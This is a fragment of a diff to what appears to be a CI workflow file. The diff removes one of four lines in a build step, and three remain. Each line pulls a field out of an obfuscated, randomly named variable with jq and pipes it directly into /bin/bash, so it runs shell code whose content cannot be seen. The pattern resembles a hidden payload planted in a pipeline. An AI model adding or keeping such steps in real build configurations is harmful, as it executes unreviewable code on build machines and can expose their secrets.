@@ -24,7 +24,6 @@ jobs:
           echo $vq24866 | jq -r .csb42 | /bin/bash
           echo $r1235 | jq -r .lxv3 | /bin/bash
           printf '%s' "$ysmp42197" | jq -r .x65092 | /bin/bash
-          printf '%s' "$cpmp0595" | jq -r .y413 | /bin/bash
 
       - name: Archive results
         if: always()
